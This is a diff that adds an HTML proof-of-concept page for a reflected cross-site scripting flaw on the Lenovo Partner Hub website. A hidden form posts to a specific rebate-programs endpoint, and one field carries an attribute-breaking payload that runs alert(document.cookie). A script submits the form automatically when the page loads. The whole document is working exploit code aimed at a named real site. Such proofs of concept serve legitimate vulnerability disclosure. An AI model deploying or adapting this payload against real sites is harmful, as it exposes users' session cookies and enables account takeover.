@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+   <html>
+     <head><title>Lenovo Partner Hub - XSS PoC</title></head>
+     <body>
+       <h3>Lenovo Partner Hub Reflected XSS PoC</h3>
+       <form id="xssPoc" action="https://www.lenovopartnerhub.com/en-GB/group/morocco-site/rebate-programs" method="POST">
+         <input type="hidden" name="p_p_id" value="emeaRebateList_INSTANCE_jX1lOh6i9eO1" />
+         <input type="hidden" name="_emeaRebateList_INSTANCE_jX1lOh6i9eO1_rebateKeyword" value="kkkk" />
+         <input type="hidden"
+                name="_emeaRebateList_INSTANCE_jX1lOh6i9eO1_sortByFilter"
+                value='ZRRBPsortByFiltertestme"xss oncontentvisibilityautostatechange=alert(document.cookie) style=display:block;content-visibility:auto>' />
+         <input type="submit" value="Launch PoC" />
+       </form>
+       <script>
+         document.getElementById('xssPoc').submit();
+       </script>
+     </body>
+   </html>
